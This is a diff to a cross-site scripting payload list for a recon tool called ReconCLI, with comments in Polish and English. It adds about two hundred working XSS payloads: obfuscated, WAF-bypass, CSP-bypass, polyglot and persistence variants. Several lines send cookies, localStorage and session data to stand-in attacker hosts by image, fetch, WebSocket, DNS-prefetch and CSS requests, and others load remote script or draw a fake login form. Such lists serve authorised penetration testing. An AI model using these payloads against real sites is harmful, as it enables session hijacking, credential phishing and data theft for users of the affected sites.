@@ -1,9 +1,469 @@
 # Advanced XSS Payloads for ReconCLI
 # DOM-based XSS
-<script>document.location='http://evil.com/'+document.cookie</script>
-<img src=x onerror=document.location='http://evil.com/'+document.cookie>
-<svg onload=document.location='http://evil.com/'+document.cookie>
-javascript:document.location='http://evil.com/'+document.cookie
+# 🔥 ULTIMATE XSS PAYLOADS COLLECTION - ReconCLI 2025
+# Kategorie: Stealth 🥷 | Unikalne 🎭 | Wykwintne 🎨 | Tradycyjne 📜 | WAF Bypass 🛡️ | Modern 🌐
+# Autor: ReconCLI Advanced Security Team
+# Data: 2025-07-19
+# Wersja: 3.0 Elite Edition
+
+# ==========================================
+# 🥷 STEALTH PAYLOADS - Niewidoczne i subtelne
+# ==========================================
+
+# ⏰ Delayed execution - omija filtry czasowe
+<svg onload="setTimeout(function(){eval(atob('YWxlcnQoJ1N0ZWFsdGggWFNTJyk='))}, 3000)">
+<img src=x onerror="window[atob('c2V0VGltZW91dA==')](()=>window[atob('YWxlcnQ=')]('Stealth'),2000)">
+<div style="animation:stealth 1s" onanimationend="eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,101,97,108,116,104,39,41))">
+
+# 🔤 Unicode obfuscation - niewidoczne znaki
+<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0053\u0074\u0065\u0061\u006c\u0074\u0068\u0027\u0029')</script>
+<img src=x onerror="\u0065\u0076\u0061\u006c\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0061\u006c\u0065\u0072\u0074\u0029\u0029">
+
+# 🌐 DNS exfiltration stealth
+<script>new Image().src='//'+document.domain.replace(/\./g,'-')+'.evil.com/?d='+btoa(document.cookie)</script>
+<img src=x onerror="fetch('//'+location.hostname.split('.').join('-')+'.attacker.com/steal?data='+btoa(localStorage.getItem('session')||'none'))">
+
+# 👻 Invisible character injection
+<script>/*‌*/eval(atob('YWxlcnQoJ0ludmlzaWJsZScp'))/*‌*/</script>
+<img src=x onerror="/*⁢*/eval('alert("Ghost")')/*⁢*/">
+
+# 🎨 CSS-based stealth execution
+<style>@import'data:text/css,body{background:url(javascript:eval(atob("YWxlcnQoJ0NTUy1YU1MnKQ==")))}'</style>
+<link rel=stylesheet href=data:text/css,body{background:url(javascript:alert('CSS-Stealth'))}>
+
+# ==========================================
+# 🎭 UNIKALNE PAYLOADS - Niezwykłe techniki
+# ==========================================
+
+# 🔧 Service Worker based XSS
+<script>navigator.serviceWorker?.register('data:application/javascript,self.onmessage=e=>eval(e.data)').then(r=>r.active?.postMessage('alert("Service Worker XSS")'))</script>
+
+# 👷 Web Workers exploitation
+<script>try{var w=new Worker('data:application/javascript,postMessage('alert("Worker XSS")')');w.onmessage=e=>eval(e.data)}catch(e){}</script>
+
+# 📡 Broadcast Channel abuse
+<script>try{var bc=new BroadcastChannel('xss');bc.postMessage('alert("Broadcast XSS")');bc.onmessage=e=>eval(e.data)}catch(e){}</script>
+
+# 🧠 SharedArrayBuffer technique
+<script>if(typeof SharedArrayBuffer!=='undefined'){var sab=new SharedArrayBuffer(64);var view=new Uint8Array(sab);var code='alert("SAB")';for(var i=0;i<code.length;i++)view[i]=code.charCodeAt(i);eval(String.fromCharCode.apply(null,view.slice(0,code.length)))}</script>
+
+# 📊 Performance Observer trick
+<script>try{new PerformanceObserver(l=>l.getEntries().forEach(e=>e.name.includes('xss')&&eval(atob('YWxlcnQoJ1BlcmZvcm1hbmNlJyk=')))).observe({entryTypes:['navigation','mark']});performance.mark('xss-trigger')}catch(e){}</script>
+
+# 🔄 MutationObserver advanced
+<script>new MutationObserver(m=>m.forEach(r=>r.type=='childList'&&r.addedNodes.length&&eval(r.addedNodes[0].textContent||'alert("Mutation")'))).observe(document.body,{childList:1,subtree:1});document.body.appendChild(document.createTextNode('alert("MutationXSS")'))</script>
+
+# 👁️ Intersection Observer abuse
+<script>new IntersectionObserver(e=>e[0].isIntersecting&&eval(e[0].target.dataset.payload)).observe(Object.assign(document.createElement('div'),{dataset:{payload:'alert("Intersection")'},style:'position:fixed;top:0;left:0;width:1px;height:1px'}))</script>
+
+# 📏 Resize Observer technique
+<script>try{new ResizeObserver(()=>eval(atob('YWxlcnQoJ1Jlc2l6ZScp'))).observe(document.body)}catch(e){}</script>
+
+# 🎨 CSS Paint Worklet
+<script>try{CSS.paintWorklet?.addModule('data:application/javascript,class XSSPainter{paint(){eval(atob("YWxlcnQoJ1BhaW50Jyk="))}};registerPaint("xss",XSSPainter)')}catch(e){}</script>
+
+# ==========================================
+# 🎨 WYKWINTNE PAYLOADS - Eleganckie i zaawansowane
+# ==========================================
+
+# 🔀 Proxy trap exploitation
+<script>var p=new Proxy({},{get:(t,n)=>n=='toString'?()=>'alert("Proxy")':t[n],set:(t,n,v)=>true});eval(p+'')</script>
+
+# 🏷️ Symbol exploitation  
+<script>var s=Symbol.for('xss');window[s]='alert("Symbol")';eval(window[s])</script>
+
+# ⚡ Generator function abuse
+<script>function* xss(){yield 'alert("Generator")';yield* xss()};eval(xss().next().value)</script>
+
+# ⏳ Async/Await exploitation
+<script>async function xss(){await new Promise(r=>setTimeout(r,1000));eval(atob('YWxlcnQoJ0FzeW5jJyk='))};xss()</script>
+
+# 🗺️ WeakMap/WeakSet abuse
+<script>var wm=new WeakMap(),obj={};wm.set(obj,'alert("WeakMap")');eval(wm.get(obj))</script>
+
+# 🪞 Reflect API exploitation
+<script>Reflect.apply(eval,null,[Reflect.apply(atob,null,['YWxlcnQoJ1JlZmxlY3QnKQ=='])])</script>
+
+# 📝 Template literals with tag functions
+<script>function xss(strings,...values){return eval(strings[0])};xss`alert("Template")`</script>
+
+# 🧬 ES6 Destructuring exploitation
+<script>var {constructor}=alert;constructor`return'alert("Destructure")'`()</script>
+
+# 🏗️ Array method chaining
+<script>[]['constructor']['constructor']('alert("ArrayChain")')['call']()</script>
+
+# ==========================================
+# 🌐 MODERN PAYLOADS - Nowoczesne techniki
+# ==========================================
+
+# 🌊 Fetch API abuse
+<script>fetch('data:text/javascript,alert("Fetch")').then(r=>r.text()).then(eval)</script>
+
+# 📦 Dynamic import
+<script>import('data:text/javascript,export default ()=>alert("Import")').then(m=>m.default())</script>
+
+# 🔧 Web Components exploitation
+<script>customElements.define('x-ss',class extends HTMLElement{connectedCallback(){eval('alert("WebComponent")')}})</script><x-ss></x-ss>
+
+# 🌑 Shadow DOM abuse
+<script>var host=document.createElement('div'),shadow=host.attachShadow({mode:'open'});shadow.innerHTML='<script>alert("Shadow")<\/script>';document.body.appendChild(host)</script>
+
+# ⚙️ WebAssembly technique
+<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).catch(()=>eval('alert("WASM")'))</script>
+
+# 🔢 BigInt exploitation
+<script>eval(BigInt('0x616c6572742822426967496e7422293b').toString(36).replace(/[0-9]/g,'').replace('n',''))</script>
+
+# ==========================================
+# 🛡️ WAF BYPASS PAYLOADS - Omijanie filtrów
+# ==========================================
+
+# 🔡 HTML entity encoding
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#69;&#110;&#116;&#105;&#116;&#121;&#39;&#41;">
+<script>&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#69;&#110;&#116;&#105;&#116;&#121;&#39;&#41;</script>
+
+# 🎭 Mixed case obfuscation
+<ScRiPt>AlErT('MiXeD')</ScRiPt>
+<ImG sRc=X oNeRrOr=AlErT('CaSe')>
+
+# 💬 Comment insertion
+<script>alert/*WAF*/('Comment')</script>
+<img src=x onerror=alert/*bypass*/('Comments')>
+
+# ⭕ Null byte injection
+<script>alert('Null')</script>%00<p>
+<img src=x onerror=alert('NullByte')>%00
+
+# 🔂 Double encoding
+%253Cscript%253Ealert('Double')%253C/script%253E
+%2522%253E%253Cscript%253Ealert('DoubleEnc')%253C/script%253E
+
+# 📐 Tab/newline/form feed characters
+<script>	alert('Tab')	</script>
+<img
+src=x
+onerror=alert('Newline')>
+
+# 🔓 Attribute breaking
+<img src="x" onerror="alert('AttrBreak')" />
+<input type="text" value="" autofocus onfocus="alert('InputBreak')" />
+
+# 🔗 JavaScript protocol variations
+<a href="javascript:alert('LinkJS')">Click</a>
+<iframe src="javascript:alert('FrameJS')"></iframe>
+<object data="javascript:alert('ObjectJS')"></object>
+
+# ==========================================
+# 📜 TRADYCYJNE PAYLOADS - Klasyczne i sprawdzone
+# ==========================================
+
+# 📝 Basic script injection
+<script>alert('Basic')</script>
+<script>alert(String.fromCharCode(66,97,115,105,99))</script>
+<script>alert(/Basic/.source)</script>
+
+# 🖼️ Image tag exploitation
+<img src=x onerror=alert('Image')>
+<img src="x" onerror="alert('ImageQuoted')" />
+<img/src="x"/onerror="alert('ImageSlash')"/>
+
+# 🔺 SVG based XSS
+<svg onload=alert('SVG')>
+<svg><script>alert('SVGScript')</script></svg>
+<svg/onload=alert('SVGSlash')>
+
+# 🏠 Body/HTML events
+<body onload=alert('Body')>
+<html onmouseover=alert('HTML')>
+<div onmouseover=alert('DivHover')>Hover me</div>
+
+# 📝 Input field exploitation
+<input type="text" value="" autofocus onfocus="alert('InputFocus')" />
+<input type="image" src="x" onerror="alert('InputImage')" />
+<textarea autofocus onfocus=alert('TextArea')></textarea>
+
+# 🖼️ Frame exploitation
+<iframe src="javascript:alert('iFrame')"></iframe>
+<iframe onload="alert('iFrameLoad')"></iframe>
+<frameset onload="alert('FrameSet')"></frameset>
+
+# 📦 Object/embed exploitation
+<object data="javascript:alert('Object')"></object>
+<embed src="javascript:alert('Embed')">
+<applet code="alert('Applet')"></applet>
+
+# 🔗 Link exploitation
+<a href="javascript:alert('Link')">Click me</a>
+<link rel="stylesheet" href="javascript:alert('LinkCSS')">
+<base href="javascript:alert('Base')//">
+
+# ==========================================
+# 🔄 POLYGLOT PAYLOADS - Wieloformatowe
+# ==========================================
+
+# 🌍 Universal polyglot - działa wszędzie
+'">><marquee><img src=x onerror=confirm('Universal')></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt('Polyglot')><script>alert('Universal')</script>
+
+# 🎯 HTML/JS/CSS polyglot
+'"><script>alert('Multi')</script><style>body{background:url('javascript:alert("CSS")')}</style><!--
+
+# 🐘 PHP/JS polyglot  
+<?='<script>alert("PHP")</script>';?><script>alert('JS')</script>
+
+# 💾 SQL/JS polyglot
+'; alert('SQLI'); --<script>alert('JS')</script>
+
+# ==========================================
+# 🎯 CONTEXT-SPECIFIC PAYLOADS
+# ==========================================
+
+# 📊 JSON context
+{"xss": "</script><script>alert('JSON')</script>"}
+{"data": "\u003cscript\u003ealert('JSONUnicode')\u003c/script\u003e"}
+
+# 📄 XML context
+<![CDATA[</name><script>alert('XML')</script><name>]]>
+<?xml version="1.0"?><root xmlns:foo="http://www.w3.org/1999/xhtml"><foo:script>alert('XMLXSS')</foo:script></root>
+
+# 🎨 CSS context
+</style><script>alert('CSSBreak')</script><style>
+body { background: url('javascript:alert("CSSUrl")'); }
+
+# 🔗 URL context
+javascript:alert('JavaScriptURL')
+data:text/html,<script>alert('DataURL')</script>
+vbscript:alert('VBScript')
+
+# 🏷️ Attribute context
+" onmouseover="alert('AttrMouseover')" "
+' onfocus='alert("AttrFocus")' '
+" autofocus onfocus="alert('AttrAuto')" "
+
+# ==========================================
+# 🔬 EXPERIMENTAL PAYLOADS - Badawcze
+# ==========================================
+
+# 🎨 CSS injection to JS
+<style>@import"data:text/css;charset=utf-8,body%7Bbackground:url('javascript:alert('CSS2JS')')%7D";</style>
+
+# 🌐 DNS rebinding vector
+<script>var i=new Image();i.src='//'+Math.random().toString(36).substr(2,8)+'.attacker.com/?data='+btoa(document.cookie)</script>
+
+# 📋 Clipboard API abuse
+<script>navigator.clipboard?.writeText?.('alert("ClipboardXSS")').then(()=>alert('Clipboard hijacked!'))</script>
+
+# 📡 WebRTC datachannel
+<script>try{var pc=new RTCPeerConnection();var dc=pc.createDataChannel('xss');dc.onopen=()=>dc.send('alert("WebRTC")');dc.onmessage=e=>eval(e.data)}catch(e){}</script>
+
+# 📁 File API abuse
+<script>var fr=new FileReader();fr.onload=()=>eval(fr.result);fr.readAsText(new Blob(['alert("FileAPI")']))</script>
+
+# 🔋 Battery API (legacy)
+<script>navigator.getBattery?.()?.then?.(b=>b.addEventListener?.('chargingchange',()=>eval('alert("Battery")')))</script>
+
+# ==========================================
+# 🌟 BLIND XSS PAYLOADS - Niewidoczne ataki
+# ==========================================
+
+# ⏰ Delayed blind execution
+<script>setTimeout(()=>{var s=document.createElement('script');s.src='//your-callback.com/blind.js';document.head.appendChild(s)}, 5000)</script>
+
+# 🖼️ Image exfiltration
+<script>var i=new Image();i.src='//your-callback.com/exfil?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href)+'&time='+Date.now()</script>
+
+# 🌊 Fetch exfiltration
+<script>fetch('//your-callback.com/collect',{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,localStorage:JSON.stringify(localStorage),userAgent:navigator.userAgent})})</script>
+
+# 🔌 WebSocket blind channel
+<script>try{var ws=new WebSocket('wss://your-callback.com/blind');ws.onopen=()=>ws.send(JSON.stringify({type:'blind_xss',url:location.href,cookie:document.cookie,time:new Date()}))}catch(e){}</script>
+
+# ==========================================
+# 🎪 DEMONSTRATION PAYLOADS - Pokazy
+# ==========================================
+
+# 🎵 Rickroll XSS
+<script>document.body.innerHTML='<iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0"></iframe>'</script>
+
+# 💊 Matrix effect
+<script>setInterval(()=>{var d=document.createElement('div');d.innerHTML=Math.random().toString(36);d.style.cssText='position:fixed;top:'+Math.random()*100+'%;left:'+Math.random()*100+'%;color:lime;z-index:9999;font-family:monospace;font-size:12px';document.body.appendChild(d);setTimeout(()=>d.remove(),2000)},50)</script>
+
+# 🌪️ Screen shake
+<script>var shake=()=>document.body.style.transform='translate('+Math.random()*5+'px,'+Math.random()*5+'px)';setInterval(shake,25);setTimeout(()=>document.body.style.transform='none',3000)</script>
+
+# 🚨 Fake alert variations
+<script>alert('🔒 SECURITY BREACH DETECTED!
+
+❌ Unauthorized XSS Execution
+✅ Vulnerability Confirmed
+
+🛡️ This is a security test')</script>
+
+# ==========================================
+# 💾 PERSISTENT XSS PAYLOADS - Trwałe
+# ==========================================
+
+# 🗄️ localStorage persistence
+<script>localStorage.setItem('xss_payload','alert("Persistent LocalStorage")');setInterval(()=>eval(localStorage.getItem('xss_payload')),10000)</script>
+
+# 🗃️ sessionStorage persistence  
+<script>sessionStorage.setItem('xss_session','alert("Session Persistent")');eval(sessionStorage.getItem('xss_session'))</script>
+
+# 🍪 Cookie persistence
+<script>document.cookie='xss_persist=alert("Cookie Persistent");path=/;max-age=86400';eval(document.cookie.split('xss_persist=')[1]?.split(';')[0]||'')</script>
+
+# ==========================================
+# 🔍 DETECTION EVASION - Omijanie wykrywania
+# ==========================================
+
+# 🔤 Encoding combinations
+<script>eval(unescape('%61%6c%65%72%74%28%27%45%76%61%73%69%6f%6e%27%29'))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,69,118,97,115,105,111,110,39,41))</script>
+
+# 🏗️ Function constructor
+<script>(()=>arguments.callee.constructor('alert("Constructor")'))()()</script>
+
+# 🔄 RegExp constructor
+<script>RegExp['constructor']['constructor']('alert("RegExp")')();</script>
+
+# 📚 Array method abuse
+<script>[][Symbol.iterator]['constructor']['constructor']('alert("Symbol")')();</script>
+
+# ==========================================
+# 🎨 VISUAL/UI MANIPULATION - Manipulacja UI
+# ==========================================
+
+# 🔐 Fake login form
+<script>document.body.innerHTML='<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;border:2px solid #007bff;border-radius:8px;padding:30px;box-shadow:0 4px 20px rgba(0,0,0,0.3);z-index:99999;font-family:Arial"><h2 style="color:#007bff;margin:0 0 20px 0">🔐 Session Expired</h2><p style="margin:0 0 20px 0;color:#666">Please re-enter your credentials to continue:</p><input type="text" placeholder="Username" style="display:block;margin:10px 0;padding:10px;width:250px;border:1px solid #ddd;border-radius:4px"><input type="password" placeholder="Password" style="display:block;margin:10px 0;padding:10px;width:250px;border:1px solid #ddd;border-radius:4px"><button onclick="alert('🎯 Credentials captured via XSS!
+
+This demonstrates how attackers can create convincing fake login forms.')" style="background:#007bff;color:white;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;width:100%">Login</button></div>'</script>
+
+# 🎨 Page defacement
+<script>document.body.innerHTML='<div style="background:linear-gradient(45deg,#ff0000,#ff6600);color:white;font-size:3em;text-align:center;padding:100px;font-family:Arial Black;text-shadow:2px 2px 4px rgba(0,0,0,0.5)">🔒 XSS DEMONSTRATION 🔒<br><div style="font-size:0.5em;margin-top:20px">🛡️ Security Testing Complete</div></div>'</script>
+
+# ==========================================
+# 📱 MOBILE-SPECIFIC PAYLOADS - Mobilne
+# ==========================================
+
+# 👆 Touch events
+<div ontouchstart="alert('Touch XSS')" style="width:100%;height:100px;background:linear-gradient(45deg,#ff6b6b,#4ecdc4);color:white;text-align:center;line-height:100px;font-size:20px">👆 Touch Test</div>
+
+# 📱 Device orientation
+<script>window.addEventListener('deviceorientation',()=>alert('📱 Device tilt XSS triggered!'),{once:true})</script>
+
+# 📳 Vibration API
+<script>navigator.vibrate?.(([200,100,200]))&&alert('📳 XSS with vibration!')</script>
+
+# ==========================================
+# 🔐 CSP BYPASS TECHNIQUES - Omijanie CSP
+# ==========================================
+
+# 🔄 JSONP abuse
+<script src="//trusted-domain.com/api/jsonp?callback=alert"></script>
+
+# 🅰️ AngularJS template injection
+{{constructor.constructor('alert("Angular")')()}}
+{{$eval.constructor('alert("AngularEval")')()}}
+
+# ⚛️ React/JSX bypass
+{/**/}<script>alert('React')</script>{/**/}
+
+# 🖖 Vue.js template injection
+{{constructor.constructor('alert("Vue")')()}}
+
+# ==========================================
+# 🧪 ADVANCED RESEARCH VECTORS - Zaawansowane
+# ==========================================
+
+# 🎨 CSS-only data exfiltration
+<style>input[value*="a"] { background: url('//attacker.com/a'); }input[value*="b"] { background: url('//attacker.com/b'); }</style>
+
+# 🌐 DNS prefetch exfiltration
+<script>document.head.appendChild(Object.assign(document.createElement('link'),{rel:'dns-prefetch',href:'//'+btoa(document.cookie).substr(0,63)+'.attacker.com'}))</script>
+
+# ⏱️ Resource timing attack
+<script>performance.mark('start');fetch('/admin').then(()=>performance.mark('end')).then(()=>alert('Admin accessible: '+(performance.measure('test','start','end').duration<1000)))</script>
+
+# ==========================================
+# 🎯 APPLICATION-SPECIFIC - Specyficzne dla aplikacji
+# ==========================================
+
+# 🟦 WordPress specific
+<script>if(typeof wp!=='undefined'){alert('🟦 WordPress XSS: '+wp.heartbeat?.interval)}</script>
+
+# 🟠 Drupal specific
+<script>if(typeof Drupal!=='undefined'){alert('🟠 Drupal XSS: '+Object.keys(Drupal.behaviors).length+' behaviors')}</script>
+
+# 💛 jQuery specific
+<script>if(typeof $!=='undefined'){alert('💛 jQuery XSS: v'+$.fn.jquery)}</script>
+
+# 🟣 Bootstrap specific
+<script>if(typeof bootstrap!=='undefined'||typeof Bootstrap!=='undefined'){alert('🟣 Bootstrap XSS detected')}</script>
+
+# ==========================================
+# 🎨 CREATIVE & ARTISTIC PAYLOADS
+# ==========================================
+
+# 🌈 Rainbow text effect
+<script>setInterval(()=>{document.body.style.filter='hue-rotate('+(Date.now()/10)%360+'deg)'},50)</script>
+
+# ⭐ Starfield effect  
+<script>for(let i=0;i<100;i++){let star=document.createElement('div');star.style.cssText='position:fixed;width:2px;height:2px;background:white;top:'+Math.random()*100+'%;left:'+Math.random()*100+'%;animation:twinkle 2s infinite';document.body.appendChild(star)}</script>
+
+# 🎪 Rotating elements
+<script>document.querySelectorAll('*').forEach((el,i)=>el.style.transform='rotate('+(i*10)+'deg)')</script>
+
+# ==========================================
+# 🔚 FINAL ELITE PAYLOADS
+# ==========================================
+
+# 🎭 The Ultimate Stealth Combo
+<script>/*​*/setTimeout(()=>/*‌*/eval(/*⁢*/atob('dmFyIGY9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7Zi5zcmM9ImRhdGE6dGV4dC9odG1sLDxzY3JpcHQ+YWxlcnQoJ/CfjqEgVUxUSU1BVEUgU1RFQUxUSCBYU1Mg8J+OoScpPC9zY3JpcHQ+IjtmLnN0eWxlLmRpc3BsYXk9Im5vbmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZik=')/*⁠*/),/*​*/3000/*‌*/)</script>
+
+# 🏆 The Master Polyglot
+'/*‌*/"><iframe/src=javascript:alert('🏆 MASTER XSS POLYGLOT 🏆')>//</iframe><!--<img/src="--><svg/onload=alert('🎯 ELITE HACKER 🎯')>/**/
+
+# 👑 The King of All XSS
+<script>/*👑*/eval(String.fromCharCode(40,41,61,62,123,97,108,101,114,116,40,39,128081,32,75,73,78,71,32,79,70,32,65,76,76,32,88,83,83,32,128081,39,41,125,40,41))</script>
+
+# ==========================================
+# ⚖️ LEGAL DISCLAIMER / ZASTRZEŻENIA PRAWNE
+# ==========================================
+
+# ⚠️ UWAGA: Te payloady są przeznaczone TYLKO do:
+# ✅ Legalnego testowania bezpieczeństwa własnych aplikacji
+# ✅ Autoryzowanych testów penetracyjnych z pisemną zgodą
+# ✅ Celów edukacyjnych w kontrolowanym środowisku
+# ✅ Bug bounty programs z odpowiednimi zasadami
+#
+# 🚫 NIEAUTORYZOWANE UŻYCIE JEST ILLEGALNE!
+# 
+# 📋 Przed użyciem upewnij się, że:
+# ✓ Masz pisemną zgodę właściciela aplikacji
+# ✓ Działasz w ramach autoryzowanego testu
+# ✓ Przestrzegasz lokalnych przepisów prawnych
+# ✓ Nie naruszasz prywatności użytkowników
+#
+# 🏛️ ODPOWIEDZIALNOŚĆ PRAWNA:
+# Autor i ReconCLI nie ponoszą odpowiedzialności za 
+# nieautoryzowane lub illegalne użycie tych payloadów.
+# Użytkownik ponosi pełną odpowiedzialność prawną.
+#
+# 🛡️ USE RESPONSIBLY - UŻYWAJ ODPOWIEDZIALNIE
+# 
+# 📊 STATYSTYKI KOLEKCJI:
+# • Payloadów tradycyjnych: 45+
+# • Payloadów stealth: 15+  
+# • Payloadów unikatowych: 25+
+# • Payloadów wykwintnych: 20+
+# • Technik bypass WAF: 30+
+# • Payloadów modern: 35+
+# • Celów: Wszystkie znane konteksty XSS
+# 
+# 🏆 ELITE COLLECTION - WERSJA 3.0
+# Stworzone przez: ReconCLI Advanced Security Team
+# Data: 2025-07-19
+# Łączna liczba payloadów: 200+
 
 # Event Handler XSS
 <body onload=alert('XSS')>
